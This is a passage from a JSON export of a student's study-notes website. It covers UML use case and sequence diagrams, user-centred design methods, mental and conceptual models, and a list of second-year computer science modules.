16.01.47](notes/images/Screenshot%202022-10-03%20at%2016.01.47.png)\n\n#### Extension Points\nAllows you define the point at which the behaviour of the extending use cases must be inserted in the base use case.\n\n#### Generalisation\nAllows to group common properties and behaviours of different use cases in a parent use case.\n\nIf A generalises B, B inherits the behaviours of A, which B can either extend or overwrite. It also inherits all relationships from A. Therefore, B adopts the basic functionality of A but decides itself what part of A is executed or changed.\n\nUses an arrow:\n\n![Screenshot 2022-10-03 at 16.45.00](notes/images/Screenshot%202022-10-03%20at%2016.45.00.png)\n\nFor example, Announce event passes on its properties and behaviours to Announce lecture and Announce talk. As a result of `\u003c\u003cinclude\u003e\u003e`, both must execute the behaviour of the use case Assign lecturer. When a lecture is announced, an exam can also be announced at the same time. They both inherit the relationship from the use case Announce event to the actor Professor. Thus, all use cases are connected to at least one actor.\n\n![Screenshot 2022-10-03 at 16.05.57](notes/images/Screenshot%202022-10-03%20at%2016.05.57.png)\n\nWe grouped the common features of Announce lecture and Announce talk, meaning we don't have to model both the `\u003c\u003cinclude\u003e\u003e` relationship and the association with the professor twice.\n\n## Creating a Use Case Diagram\nFirst identify actors and use cases and then place them in relationships with one another. You then describe the use cases in detail.\n\n### Identifying Actors and Use Cases\n1. Analysis of requirements documents.\n2. Analysis of the expectations of future users.\n\nTo identify the actor:\n\n- Who uses the main use case?\n- Who needs support for their daily work?\n- Who is responsible for system administration?\n- What are the external devices/software systems with which the system must communicate?\n- Who has an interest in the results of the system?\n\nThen you can derive the use cases:\n\n- What are the main tasks that an actor must perform?\n- Does an actor want to query or even modify information contained in the system?\n- Does an actor want to inform the system about changes in other systems?\n- Should an actor be informed about unexpected events within the system?\n\nYou often start with top level requirements and then continue to refine them until you have specified what the system is able to do. For example, a top level requirement for a university administration system could be that the system can be used for student administration. If we refine it, we define that new students should be able to register at the university and enroll for studies, that the students' grades should be stored etc.\n\n### Describing Use Cases\nShort concise names.\n\nGuideline for the length of use case description is approximately 1-2 pages per use case. Structured approach:\n\n-   Name\n-   Short description\n-   Precondition: prerequisite for successful execution\n-   Postcondition: system state after successful execution\n-   Error situations: errors relevant to the problem domain\n-   System state on the occurrence of an error\n-   Actors that communicate with the use case\n-   Trigger: events which initiate/start the use case\n-   Standard process: individual steps to be taken\n-   Alternative processes: deviations from the standard process\n\nExample:\n\n![Screenshot 2022-10-03 at 16.59.59](notes/images/Screenshot%202022-10-03%20at%2016.59.59.png)\n\n### Pitfalls\n#### Modeling Processes\nWe do not model processes or workflows in use case diagrams.\n\n![Screenshot 2022-10-03 at 17.01.05](notes/images/Screenshot%202022-10-03%20at%2017.01.05.png)\n\n#### Setting system boundaries incorrectly\n![Screenshot 2022-10-03 at 17.01.32](notes/images/Screenshot%202022-10-03%20at%2017.01.32.png)\n\n#### Mixing abstraction levels\nAvoid representing top level use cases with technically oriented use cases in the same diagram, like in the figure below.\n\nTo avoid this you should proceed iteratively. First creating the use case diagram with use cases that are based on the business objectives (for example management of student data) and then refine the use cases down to the technical requirements (selecting a printer).\n\n![Screenshot 2022-10-03 at 17.02.57](notes/images/Screenshot%202022-10-03%20at%2017.02.57.png)\n\n#### Functional decomposition\nUse cases, even included or extending ones, can always be executed independently. If they can only be executed within the scope of another use case and not independently, they are not use cases and must not be depicted as such.\n\nIn the figure below, the use case Issue certificate is broken down into individual sub-functions necessary to execute it. They are modelled as use cases even though sometimes they are not meaningful independent use cases, such as Enter data.\n\nThe use case Log is not a functionality that is part of Issue certificate, it is a precondition that the user must be logged in with sufficient authorisations for being able to execute this use case.\n\n![Screenshot 2022-10-03 at 17.05.37](notes/images/Screenshot%202022-10-03%20at%2017.05.37.png)\n\nThis is sufficient:\n\n![Screenshot 2022-10-03 at 17.06.00](notes/images/Screenshot%202022-10-03%20at%2017.06.00.png)\n\n#### Incorrect associations\nHaving two actors doesn't mean that either one of the other is involved in the execution of the use case: it means that both are necessary for its execution.\n\nIn the figure below, Assistant and Professor are involved in the execution of the use case Issue information, which is not the intention.\n\nTo resolve this, we introduce Research Associate from which the two actors inherit.\n\n![Screenshot 2022-10-03 at 17.06.49](notes/images/Screenshot%202022-10-03%20at%2017.06.49.png)\n\n#### Modelling redundant use cases\nAs you can see in the figure below, we have modelled separate use cases for creating, updating and deleting courses. This is fine for a small diagram. \n\nHowever, when modelling a real application, the diagram would quickly become unmanageable. \n\n![Screenshot 2022-10-03 at 17.09.18](notes/images/Screenshot%202022-10-03%20at%2017.09.18.png)",
    "lastmodified": "2022-11-24T12:21:04.331613302Z",
    "tags": null
  },
  "/notes/university/uml-sequence-diagram": {
    "title": "UML Sequence Diagram",
    "content": "# UML Sequence Diagram\n---\n**Inter-object behaviour**: interactions between objects.\n\n**Interaction**: how data is exchanged between interaction partners.\n\n**Interaction partners**:\n    - Human (lectures, administrator, ...)\n    - Non-human (sever, printer, executable software, ...)\n\nExamples of interactions: \n- Conversation between persons.\n- Message exchange between humans and a software system.\n- Communication protocols.\n- Sequence of method calls in a program.\n\n## Interaction Diagrams\nUsed to:\n1. Specify interactions.\n2. Model concrete scenarios.\n3. Describe communication sequences at different levels of detail.\n\nThey show:\n- System's interaction with its environment.\n- Interaction between system parts in order to show how a specific use case can be implemented.\n- Interprocess communication in which the partners involved must observe certain protocols.\n- Communication at class level (operation calls, inter-object behaviour).\n\n### Interaction Partners\nDepicted as lifelines.\n\nHead of the lifeline:\n- `roleName:Class`\n- Roles are a more general concept than objets.\n- Objects can take on different roles over its lifetime.\n\nBody of the lifeline:\n- Vertical, dashed line.\n- Lifetime of the object associated with it.\n\n![Screenshot 2022-10-20 at 12.13.13](notes/images/Screenshot%202022-10-20%20at%2012.13.13.png)\n\n## Sequence Diagram\nInteraction = sequence of event specifications.\n\n- Horizontal axis: involved interaction partners.\n- Vertical axis: chronological order of the interaction.\n\n![Screenshot 2022-10-20 at 12.11.41](notes/images/Screenshot%202022-10-20%20at%2012.11.41.png)\n\n## Exchanging Messages\nInteraction: sequence of events.\n\n**Message** is defined via send event and receive event.\n\nExecution specification:\n- Continuous bar.\n- Used to visualise when an interaction partner executes some behaviour.\n\n![Screenshot 2022-10-20 at 12.47.57](notes/images/Screenshot%202022-10-20%20at%2012.47.57.png)\n\nOrder of messages:\n![Screenshot 2022-10-20 at 12.48.16](notes/images/Screenshot%202022-10-20%20at%2012.48.16.png)\n\n### Messages\n**Synchronous message**:\n- Filled arrow.\n- Sender waits for a response before continuing.\n- Syntax of message name: `msg(par1, par2)`\n\n**Asynchronous message**:\n- Normal arrow.\n- Sender continues without waiting for a response message.\n- Syntax: `msg(par1, par2)`\n\n**Response message**;\n- Dashed lines, normal arrow.\n- May be omitted if content and location are obvious.\n- Syntax: `att=msg(par1, par2):val`\n    - `att`: return value can optionally be assigned to a variable.\n    - `msg`: name of the message.\n    - `val`: return value.\n\nFound message: sender of a message is unknown or not relevant.\nLost message: receiver is unknown or not relevant.\n\n![Screenshot 2022-10-20 at 14.31.09](notes/images/Screenshot%202022-10-20%20at%2014.31.09.png)\n\n**Time-consuming message**:\n- Message with duration.\n- Usually messages are assumed to be transmitted without any loss of time.\n- Expresses that time elapses between the sending and the receipt of a message.\n\n![Screenshot 2022-10-20 at 14.32.16](notes/images/Screenshot%202022-10-20%20at%2014.32.16.png)\n\n## Objects\nObject creation:\n- Arrowhead points to the head of the lifeline of the object to be created.\n- Keyword: `new`.\n\nObject destruction:\n- Object is deleted.\n- Large cross at the end of the lifeline.\n\n|![200](notes/images/Screenshot%202022-10-20%20at%2014.33.37.png%5C)|![400](notes/images/Screenshot%202022-10-20%20at%2014.36.41.png%5C)|\n\n## Combined Fragments\nIt models various control structures and has **12 predefined types of operators**.\n\n![Screenshot 2022-10-20 at 14.40.55](notes/images/Screenshot%202022-10-20%20at%2014.40.55.png)\n\n### Types of Combined Fragments\n\n![Screenshot 2022-10-20 at 14.41.12](notes/images/Screenshot%202022-10-20%20at%2014.41.12.png)\n\n#### Alt Fragment\n- To model alternative sequences, similar to **switch statement**.\n- Guards: used to select one path to be executed.\n    - Modelled in square brackets.\n    - default: `true`\n    - predefined: `[else]`\n    - Have to be **disjoint** to avoid indeterministic behaviour.\n\n- Multiple operands.\n\n#### Opt Fragment\n- To model an optional sequence.\n- Execution at runtime is dependent on the guard.\n- Exactly **one** operand.\n- Similar to **if statement** without the else branch.\n- Equivalent to **alt** fragment with two operands, one of which is empty.\n\n![Screenshot 2022-10-20 at 14.42.57](notes/images/Screenshot%202022-10-20%20at%2014.42.57.png)\n\n#### Loop Fragment\n- To express that a sequence is to be executed repeatedly.\n- Exactly **one** operand.\n- `loop` followed by the min/max number of iterations.\n    - default: `(*) ..` no upper limit.\n\nGuard:\n- Evaluated as soon as the minimum number of iterations has taken place.\n- Checked for each iteration within the `(min, max)` limits.\n- If the guard evaluates to false, the execution of the loop is terminated.\n\n![Screenshot 2022-10-20 at 14.46.51](notes/images/Screenshot%202022-10-20%20at%2014.46.51.png)\n\n#### Break Fragment\n- Simple form of **exception handling**.\n- Exactly one operand with a guard.\n- If the guard is true:\n    - Interactions within this operand are executed.\n    - Remaining operations of the surrounding fragment are omitted.\n    - Interaction continues in the next higher level fragment.\n    - Different behaviour than `opt` fragment.\n\n![Screenshot 2022-10-20 at 14.48.11](notes/images/Screenshot%202022-10-20%20at%2014.48.11.png)\n\nNote that **D** is not executed if **break** is executed.\n\n##### Loop and Break Fragment - Example\n![Screenshot 2022-10-20 at 14.49.23](notes/images/Screenshot%202022-10-20%20at%2014.49.23.png)\n\n#### Seq Fragment\n- Default order of events.\n- Weak sequencing:\n    1. Ordering of events within each of the operands is maintained in the result.\n    2. Events on different lifelines from different operands may come in any order.\n    3. Events on the same lifeline from different operands are ordered such that an event of the first operand comes before that of the second operand.\n\n![Screenshot 2022-10-20 at 14.50.46](notes/images/Screenshot%202022-10-20%20at%2014.50.46.png)\n\n##### Seq Fragment - Example\n![Screenshot 2022-10-20 at 14.51.13](notes/images/Screenshot%202022-10-20%20at%2014.51.13.png)\n\n#### Strict Fragment\n- Sequential interaction with order.\n- Order of event occurrences on different lifelines between different operands is significant.\n\nMessages in an operand that is **higher up** on the **vertical** axis are always exchanged before the messages in an operand that is lower down on the vertical axis.\n\n![Screenshot 2022-10-20 at 14.52.14](notes/images/Screenshot%202022-10-20%20at%2014.52.14.png)\n\n##### Strict Fragment - Example\n![Screenshot 2022-10-20 at 14.52.29](notes/images/Screenshot%202022-10-20%20at%2014.52.29.png)\n\n#### Par Fragment\n- To set aside chronological order between messages in different operands.\n- Execution paths of different operands can be interleaved.\n- Restrictions of each operand need to be respected.\n- Order of the different operands is irrelevant.\n- Concurrency, no true parallelism\n- \n![Screenshot 2022-10-20 at 14.53.25](notes/images/Screenshot%202022-10-20%20at%2014.53.25.png)\n\n##### Par Fragment - Example\n![Screenshot 2022-10-20 at 14.53.39](notes/images/Screenshot%202022-10-20%20at%2014.53.39.png)",
    "lastmodified": "2022-11-24T12:21:04.571249843Z",
    "tags": null
  },
  "/notes/university/university-hub": {
    "title": "Brunel - Computer Science Hub",
    "content": "# Brunel - Computer Science Hub\n\n\u003ccenter\u003e\u003cimg src=\"http://assets.stickpng.com/images/584fce586a5ae41a83ddee93.png\" width=60% height=60%\u003e\u003c/center\u003e\n\nHere you can find everything related to my university course.\n\n## Useful Links\n[Brightspace](https://brightspace.brunel.ac.uk/)\n\n## Notes\n2022/2023 - [Year 2](notes/university/year-2.md)",
    "lastmodified": "2022-11-24T12:21:04.658507586Z",
    "tags": null
  },
  "/notes/university/user-centred-design": {
    "title": "User-Centred Design",
    "content": "# User-Centred Design\nIt is important to ensure that we meet users needs, this is what user-centered design is all about.\n\nThe problem with traditional development is that:\n- Software engineering methodologies primarily focus on large, batch processing, non-interactive software systems (functionality and automation).\n- It ignores the role of interactivity and the important of the user. Users are just an input and the end point the output.\n\n## Evolution of Software Development Methodologies\n### Waterfall Model (1970)\n- Popular methodology.\n- Sequential and discreet steps, can't go back.\n- Requirements are written up front.\n\nIssues:\n- Requirements usually from clients and not users.\n- Requirements represented in speech/text.\n- Contract comes before understanding user needs.\n\n### Boehm's Spiral Model (1988)\n- Major improvement.\n- Spiral vs sequential steps.\n- Some flexibility to go back.\n- Each loop is a phase of the software process.\n- Each phase begins with a design goal and ends with client reviewing progress.\n- Incorporates risk management.\n- No user involvement.\n\n![500](notes/images/Screenshot%202022-10-28%20at%2011.32.19.png)\n\n### Agile Approach (2001)\n- Much more flexible.\n- Close collaboration with development team and  business stakeholders.\n\nAgile has four core values:\n1. Individuals and interactions over processes and tools.\n2. Working software over comprehensive documentation.\n3. Customer collaboration over contract negotiation.\n4. Responding to change over following a plan.\n\n## Why bother with Usability Engineering?\nUsability engineering is a discipline that focuses on improving the usability and user friendliness of the interactive systems.\n\nPay a little now, or a pay a lot later.\n\n**63%** of large software projects go over cost, managers gave four usability-related reasons:\n1. Users requested changes.\n2. Overlooked tasks by users/designers (both).\n3. Users did not understand their own requirements.\n4. Insufficient user-developer communication and understanding.\n\nIt is far too easy to jump into detailed design that:\n- Is founded on incorrect requirements.\n- Has inappropriate dialogue flow.\n- Is not easily used.\n- Is never tested until it is too late.\n\nHow can we engineer systems that consider the users? We need to work **with** potential users in an integrated design process.\n\n![450](notes/images/Screenshot%202022-10-28%20at%2011.39.55.png)\n\n## User-Centered Design (UCD)\nUCD approaches:\n- Requirements are clearly understood and articulated.\n- Requirements are communicated to designers.\n- Stakeholders are on board and involved.\n- Evaluation takes place with actual users.\n- User feedback is incorporated into the design.\n- Preparation for handover to client is considered.\n\n**User-centered design** is a 'philosophy' based on needs and interests of the user, emphasising on making the product **usable** and **understandable**.\n\n1. Places user at the centre of the design.\n2. Involves the user.\n3. Integrates knowledge/expertise from different disciplines in HCI.\n4. Highly iterative.\n\n![500](notes/images/Screenshot%202022-10-28%20at%2011.46.21.png)\n\n# User-Centred Design Methods and Techniques\n---\n## Soft Systems Methodology (SSM) 1990's\nIt is a systems methodology: looks a the **whole** system (holistic not reductionist).\n\nEmphasis on **understanding the situation** and solving **complex** problems:\n- Used in early stages of design lifecycle.\n- Used in systems analysis - which recognises the more complex and fuzzy nature of organisational life where a variety of goals are being pursued.\n- Interpretive and subjective approach (opinions sought), not quantitative.\n- User centred: values, beliefs and **views**.\n\nIt only takes analyst up to design, says nothing about implementation or evaluation.\n\n### The Seven Stages of SSM\n![500](notes/images/Screenshot%202022-10-28%20at%2011.54.52.png)\n\n## Usability Engineering Lifecycle (1999)\nIt was designed as a usability test plan and integrated into software development.\n\nIterative model including three phases:\n1. **Requirement analysis** - understand user issues, what tasks users need to do, set goals for usability study.\n2. **Design, testing and development** - conceptual design, project standards, final design.\n3. **Installation** - feedback from users.\n\n![Screenshot 2022-10-28 at 11.57.12](notes/images/Screenshot%202022-10-28%20at%2011.57.12.png)\n\n## Star Lifecycle (1989)\nIt was developed by HCI professional and emphasises that ordering of activities is inappropriate.\n\nIt is evaluation centred and encourages iteration. It is also applicable to both small and large projects.\n\n![400](notes/images/Screenshot%202022-10-28%20at%2011.58.24.png)\n\n### Pros and Cons\n- Pros:\n    - It allows designers to match the process to their developing needs, because needs are hard to specify initially (as evaluation directs progress).\n- Cons:\n    - Difficult to control process.\n    - Procedural models (e.g. waterfall) allow developers and managers to get an overall view of the development effort to track progress, specify deliverables, allocate resources and set targets.\n\n## Participatory Design (PD)\nIt brings users to the heart of the design process, they are involved with every stage of the design.\n\nIt came about due to other methods involving users at certain stages of the process only e.g. requirements gathering, evaluation etc.\n\nOther terms: co-creation, co-design, co-operative design.\n\nUsers are the experts - they have knowledge that the designers/developers do not. They also take an active role in co-designing solutions for themselves.\n\nDesigning **for** them vs designing **with** them.\n\n### PD Methods\nAnything goes but often **workshop-based**.\n\nThe aim is to encourage creativity and 'out of the box' thinking.\n\nThere are no fixed approach, methods or tools. It is about using the right combination for the job at hand.\n\nExamples:\n- Brainstorming - Love Letter/Breakup Letter, magic button.\n- Practical - Lego, plasticine, wooden bricks, straws, rope.\n- Understanding process/interaction - journey mapping, storyboards, role play.\n- Technical - sketching, wireframes (low/hi fidelity), prototyping.\n\n### Pros and Cons\n- Pros:\n    - Users' sense of ownership is increased over end product.\n    - More likely to result in system that meets user needs, are usable, feasible and meaningful in their context.\n- Cons:\n    - Can be complex and time consuming.\n    - Not really practical - getting all stakeholders together.\n    - Difficult to accommodate differing needs, desires and requirements from the stakeholders.\n    - Users' and developers thinking is constrained by what they already know.\n    - Need to manage user expectations - not everything will be included in final design.\n\n## Human Centred Design Process - IDEO\nIt is a HCD discipline which starts with people and ends with innovative solutions to match user needs.\n\nIt has three phases:\n1. Inspiration - understand situation and people.\n2. Ideation:\n    - Make sense of what you've learned.\n    - Come up with lots of ideas.\n    - Design, prototype and evaluate, refine and iterate.\n    - Implementation - final solution.\n\n### Design Thinking Process\nDiscipline of design thinking, which originates from design.\n\nPhases:\n1. Empathise - understand context and users.\n2. Define - define problem area.\n3. Prototype - build, evaluate and refine design.\n4. Test - test design with users and refine.\n\nIt is an iterative approach.\n\n### Double Diamond (The British Design 2005)\nDiscipline of design thinking, also originates from design.\n\nStructured design approach to tackle challenges and problems.\n\nIt has four phases:\n- Discover: insight into problem.\n- Define: area to focus on.\n- Develop: potential solutions.\n- Deliver: solutions.\n\nIt is based on the concept of divergent and convergent thinking.\n\n![500](notes/images/Screenshot%202022-10-28%20at%2012.27.11.png)\n### Double Diamond (adapted by Dan Nessler)\n![500](notes/images/Screenshot%202022-10-28%20at%2012.35.21.png)\n\n#### Stage 1 - Doing the Right Thing\nIt has research added to the **Discover** phase (diverging) and synthesis added to the **Define** phase (converging).\n\nDiscover/Research - understanding problem to be addressed:\n- Think 'outside of the box' - rip the design brief.\n- Cluster topics - organise findings, identify areas for focus.\n- Research problems - primary and secondary.\n\nDefine/Synthesis - make sense of findings:\n- Insights gained? What have you learnt?\n- What themes have evolved?\n- Create HMW (how might we) questions.\n\n#### Stage 2 - Doing Things Right\n- Ideation added to **Develop** phase (diverging).\n- Implementation added to **Deliver** phase (converging).\n\nDevelop/Ideation - ideas to address problem:\n- Ideate - come up with lots of ideas (out of the box thinking).\n- Evaluate - evaluate ideas and select best/favourite ones.\n\nDeliver/Implementation - develop final solution:\n- Prototype, test and iterate selected ideas.\n- Repeat.\n- Converge on final solution - out.\n\n![Screenshot 2022-10-28 at 12.59.30](notes/images/Screenshot%202022-10-28%20at%2012.59.30.png)\n\n### Lean UX (User Experience)\nThe aim is to create well designed products.\n\n- Highly collaborative.\n- Involves constant iteration.\n- Frequent contact with users.\n- **Objective** - to get feedback as quickly as possible.\n- **Focus** - user needs and experience.\n- Highly iterative.\n- Compliments **Agile** development.\n\nPhases:\n1. Outcomes - What are your assumptions about the user? Turn assumptions into hypothesis.\n2. Design - design product collaboratively.\n3. MVP - create basic mock-up to use with target users e.g. wireframes, prototype.\n4. Research and Learning - get user feedback on MVP.",
    "lastmodified": "2022-11-24T12:21:04.691868186Z",
    "tags": null
  },
  "/notes/university/user-models-and-conceptual-design": {
    "title": "User Models and Conceptual Design",
    "content": "# User Models and Conceptual Design\n## Making Sense of the World\nTransparent objects expose their functions, for example a bicycle.\n\nOpaque objects however, hide their functions.\n\n## Mental Models\nModels people have of themselves, others, their environment and thing with which they interact.\n\nIt is based on **metaphors**. For example, computer as a typewriter/personal assistant/communications centre.\n\nMental models are formed through:\n- By the self.\n- Shown by others (practical demonstration).\n- Told by someone else (instruction).\n\n![Screenshot 2022-10-20 at 15.27.06](notes/images/Screenshot%202022-10-20%20at%2015.27.06.png)\n\n### Mental Models and HCI\n![Screenshot 2022-10-20 at 15.27.36](notes/images/Screenshot%202022-10-20%20at%2015.27.36.png)\n\n### Types of Mental Models to Consider\n![Screenshot 2022-10-20 at 15.28.13](notes/images/Screenshot%202022-10-20%20at%2015.28.13.png)\n\n### Mental Models in HCI\nKnowledge of users' mental models is useful in design.\n\nUsers apply them:\n1. To predict future events.\n2. To find causes of observed events.\n3. To determine appropriate actions to cause changes.\n\nDesigning good MMs is useful in manipulating user behaviours.\n\nMore examples [here](https://www.deliverableux.com/10-examples-of-mental-models-in-ux-design)\n\n### Application of Mental Models in UE\nGood models **should** help you use machines.\n\nHow can MMs be used in UE/HCI?\n\n1. Helps users develop effective models with appropriate representations in the interface.\n2. Ensure users don't develop inappropriate MMs of devices.\n\n## Conceptual Models\nTerm used to describe the ways systems are **designed** to be understood. It should help the user \"figure it out\".\n\nA good **conceptual** model is a high level description of:\n1. The proposed system in terms of a set of integrated ideas and concepts.\n2. What it should do, behave and look like.\n3. How it should be understood by the users, as intended.\n\n![Screenshot 2022-10-20 at 15.33.32](notes/images/Screenshot%202022-10-20%20at%2015.33.32.png)\n\n### Implications for System Designers\n1. Choose the MM you intend the user to adopt, **before** designing the user interface.\n2. Exploit the system image ('look and feel') to convey the intended MM.\n3. Hide aspects of the system image that conflict with the activity/conceptual model.\n4. Link the choice of MM to the intended means of interaction.\n\n### Doing Conceptual Design\nConceptual design involves:\n- Structuring information space.\n- Creating of alternative solutions.\n- Determining which design concept to pursue.\n\nTools involved in conceptual design:\n- Sketching, brainstorming, card sorting, flowchart, storyboards, scenarios etc.\n- Personas, use cases.",
    "lastmodified": "2022-11-24T12:21:04.728481054Z",
    "tags": null
  },
  "/notes/university/year-2": {
    "title": "Modules",
    "content": "# Modules\n\n\u003ccenter\u003e\u003cimg src=\"https://c.tenor.com/nkYsPDoADwgAAAAC/computer-pixel-art.gif\"\u003e\u003c/center\u003e\n\nA list of all the different modules I am taking during my second year.\n\n* Year 2 is **1/3** of the final grade!\n\n---\n## [CS2001](notes/university/cs2001.md) - Group Project\n---\n## [CS2002](notes/university/cs2002.md) - Software Development\n---\n## [CS2003](notes/university/cs2003.md) - Usability Engineering\n---\n## [CS2004](notes/university/cs2004.md) - Algorithms\n---\n## [CS2005](notes/university/cs2005.md) - Networks and Operating Systems\n",
    "lastmodified": "2022-11-24T12:21:04.893359423Z",
    "tags": null
  }
}